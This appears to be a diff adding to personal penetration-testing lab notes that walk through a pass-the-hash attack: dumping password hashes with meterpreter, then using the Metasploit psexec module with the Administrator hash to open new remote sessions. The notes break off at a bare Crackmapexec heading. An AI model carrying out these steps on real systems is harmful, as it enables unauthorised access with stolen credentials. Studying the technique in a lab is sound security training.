@@ -262,6 +262,71 @@ Now we want to try the first technique with the PSExec metasploit module.
 
 meterpreter: `hashdump`
 
-We also 
+We also copy the LM hash into the txt file.
+
+We put this meterpreter session in the background using ctrl z
+
+`search psexec`
+
+We look for 9. 
+
+`use [9]`
+
+We use the same payload as before
+
+`show options`
+
+`sessions`
+
+our current sessions runs on port xx. We want to start another meterpreter session, so we configure the payload again with different parameters:
+
+`set lport 1234`
+
+
+`set rhosts [target IP]`
+
+`Set SMBUser Administrator`
+
+`set SMBPass [LM NTLM Hash]`
+
+`exploit`
+
+doesn't work, because we have to specify the target:
+
+`set target Command`
+
+`exploit`
+
+still no session. We need to configure the target different:
+
+`set target Native\ upload`
+
+`exploit`
+
+meterpreter: `sysinfo`
+
+meterpreter: `getuid`
+
+Successfully obtained a meterpreter session. Lets do this again:
+
+meterpreter: `exit`
+
+msf6 exploit: `sessions`
+
+We see that we are still in the session where we obtained the hashes earlier. So we kill that:
+
+msf6 exploit: `Sessions -K`
+
+`show options`
+
+`exploit`
+
+We gained access again.
+
+### Crackmapexec
+
+crackmapexec
+
+
 
 
